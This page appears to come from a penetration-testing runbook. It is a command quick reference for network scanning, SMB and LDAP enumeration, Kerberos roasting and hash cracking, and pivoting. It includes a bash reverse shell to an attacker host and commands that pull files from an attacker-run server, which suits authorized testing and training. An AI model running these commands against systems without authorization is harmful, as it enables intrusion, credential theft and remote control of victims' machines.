---
title: Command Index
description: A focused quick reference of the commands used most across the runbook, grouped by operator workflow and linked to the full playbooks.
hide:
  - toc
---

# Command Index

The commands you reach for first, grouped by workflow. Set `$IP`, `$SUBNET`, `$LHOST`, `$DOMAIN`, and `$DC_IP` from **Variables**, replace the remaining placeholders, and confirm scope before running anything. Use the linked playbooks for prerequisites, alternatives, expected output, and cleanup.

## Discover and scan

```bash
# Local Layer 2 host discovery
sudo nmap -sn -n -PR $SUBNET -oA hosts-l2

# Full TCP scan and service identification in one command
sudo nmap -sS -sV -Pn -n -p- --open -oA tcp-all $IP

# Initial UDP coverage
sudo nmap -sU -Pn -n --top-ports 100 --open -oA udp-top100 $IP
```

More: [Network Scanning](enumeration/network-scanning.md) · [Reconnaissance](enumeration/reconnaissance.md)

## Enumerate exposed services

```bash
# SMB anonymous share enumeration
nxc smb $IP -u '' -p '' --shares

# Discover LDAP naming contexts before choosing a search base
ldapsearch -x -H ldap://$DC_IP -s base -b '' namingContexts

# Fingerprint and enumerate an observed HTTP service
whatweb <scheme>://$IP:<port>
feroxbuster -u <scheme>://$IP:<port> -w <wordlist> -o ferox.txt
```

More: [Service Playbooks](information-gathering/index.md) · [SMB](information-gathering/service-analysis/smb.md) · [LDAP](information-gathering/service-analysis/ldap.md) · [Applications](applications/index.md)

## Credentials and Active Directory

```bash
# Offline hash cracking
hashcat -m <mode> hashes.txt <wordlist>

# AS-REP roast known usernames without credentials
impacket-GetNPUsers $DOMAIN/ -usersfile users.txt -dc-ip $DC_IP -no-pass -request -format hashcat -outputfile asrep.hash

# Kerberoast with valid domain credentials
impacket-GetUserSPNs $DOMAIN/<user>:'<pass>' -dc-ip $DC_IP -request -outputfile tgs.hash

# Lower-noise first-pass BloodHound collection
bloodhound-python -c DCOnly -d $DOMAIN -u <user> -p '<pass>' -ns $DC_IP --zip
```

More: [Password Cracking](tools/password-cracking.md) · [Active Directory](privilege-escalation/active-directory/index.md) · [BloodHound](tools/bloodhound.md) · [Impacket](tools/impacket.md)

## Shells and host triage

```bash
# Listener and Bash reverse shell
nc -lvnp <port>
bash -c 'bash -i >& /dev/tcp/$LHOST/<port> 0>&1'

# Upgrade an established Linux shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl+Z, then run locally
stty raw -echo; fg
export TERM=xterm

# Linux situational awareness
id; uname -a; sudo -l
find / -type f -perm -4000 2>/dev/null
```

```powershell
# Windows situational awareness
whoami /all
```

More: [Bind and Reverse Shells](exploitation/shells/bind-reverse-shells.md) · [Linux Privilege Escalation](privilege-escalation/linux/index.md) · [Windows Privilege Escalation](privilege-escalation/windows/index.md)

## Access, transfer, and pivot

```bash
# WinRM access when 5985 or 5986 is available
evil-winrm -i $IP -u <user> -p '<pass>'

# Attacker serves; Linux target pulls
python3 -m http.server 8000 --bind $LHOST
curl -fsSL http://$LHOST:8000/<file> -o /tmp/<file>

# SSH local and dynamic forwards through an accessible pivot
ssh -N -L 8080:<internal-host>:80 <user>@$IP
ssh -N -D 1080 <user>@$IP
```

```powershell
# Windows target pulls
Invoke-WebRequest http://$LHOST:8000/<file> -OutFile C:\Windows\Temp\<file>
```

More: [Lateral Movement](lateral-movement/index.md) · [File Transfer Techniques](data-exfiltration/file-transfer-techniques.md) · [Port Forwarding](port-forwarding/index.md)

---

These are starting points. Use the linked playbooks before changing scan rates, spraying credentials, running broad templates, dumping secrets, or executing remotely.
